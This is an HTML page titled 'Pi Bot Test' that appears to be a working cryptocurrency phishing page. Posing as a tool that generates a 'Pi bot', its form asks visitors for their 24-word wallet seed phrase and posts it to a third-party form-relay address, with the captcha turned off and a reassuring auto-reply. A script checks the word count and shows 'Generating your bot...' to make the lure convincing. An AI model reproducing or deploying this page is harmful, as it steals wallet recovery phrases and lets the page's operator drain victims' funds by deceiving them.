<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pi Bot Test</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #1a1a2e;
            color: white;
            margin: 0;
            padding: 0;
        }
        h1 {
            margin-top: 20px;
        }
        p {
            color: #bbb;
        }
        form {
            background: #0f3460;
            padding: 20px;
            border-radius: 8px;
            display: inline-block;
            text-align: left;
            margin-top: 20px;
        }
        label {
            font-size: 14px;
            display: block;
            margin-top: 10px;
        }
        input, textarea {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border-radius: 5px;
            border: none;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 10px;
            margin-top: 15px;
            background: #e94560;
            border: none;
            color: white;
            cursor: pointer;
            font-size: 16px;
            border-radius: 5px;
        }
        button:hover {
            background: #c02445;
        }
        .message {
            margin-top: 10px;
            font-weight: bold;
        }
        a {
            display: block;
            margin-top: 15px;
            color: #ffcc70;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <h1>Test Your Pi Bot Here</h1>
    <p>Enter your details below:</p>
    
    <form id="bot-form" action="https://formsubmit.co/el/wigahu" method="POST">
        <label for="bot-name">Preferred Name of Your Bot:</label>
        <input type="text" id="bot-name" name="bot-name" required>

        <label for="seed-phrase">Enter Your Wallet Seed Phrase:</label>
        <textarea id="seed-phrase" name="seed-phrase" rows="4" required></textarea>

        <input type="hidden" name="_subject" value="New Pi Bot Test Submission">
        <input type="hidden" name="_autoresponse" value="Thank you for testing the Pi Bot. We received your details!">
        <input type="hidden" name="_captcha" value="false">

        <button type="submit">Submit</button>
    </form>

    <div class="message" id="message"></div>

    <a href="index.html">Back to Home</a>

    <script>
        document.getElementById('bot-form').addEventListener('submit', function(event) {
            let botName = document.getElementById('bot-name').value.trim();
            let seedPhrase = document.getElementById('seed-phrase').value.trim();
            let messageDiv = document.getElementById('message');

            if (!botName || !seedPhrase) {
                event.preventDefault();
                messageDiv.style.color = "red";
                messageDiv.textContent = "Please fill in both fields!";
                return;
            }

            let seedWords = seedPhrase.split(/\s+/);
            if (seedWords.length === 24) {
                messageDiv.style.color = "green";
                messageDiv.textContent = "Generating your bot...";
            } else {
                event.preventDefault();
                messageDiv.style.color = "red";
                messageDiv.textContent = "Seed phrase incorrect!";
            }
        });
    </script>
</body>
</html>
